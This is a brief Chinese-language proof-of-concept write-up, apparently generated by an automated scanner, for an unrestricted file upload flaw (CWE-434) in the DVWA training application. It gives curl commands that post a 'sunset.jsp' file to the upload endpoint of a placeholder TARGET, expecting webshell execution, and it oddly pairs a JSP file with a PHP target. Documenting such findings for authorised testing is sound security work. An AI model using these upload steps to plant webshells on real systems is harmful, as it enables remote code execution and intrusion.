# POC — DVWA 044.php 无限制文件上传导致任意 PHP 文件写入 web 目录（RCE）

- finding_id: `LLM-6ccece6535f3`
- type: `file_upload` / CWE-434
- severity: `high`
- file: `044.php:16`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/vulnerabilities/upload/ (044.php)'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 不安全文件上传 载荷**  
```http
curl -sS -i -X POST 'http://TARGET:8080/vulnerabilities/upload/ (044.php)' \
  -F 'uploaded=@sunset.jsp;filename=sunset.jsp'
```
预期：上传文件可访问/解析，返回 webshell 执行结果。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。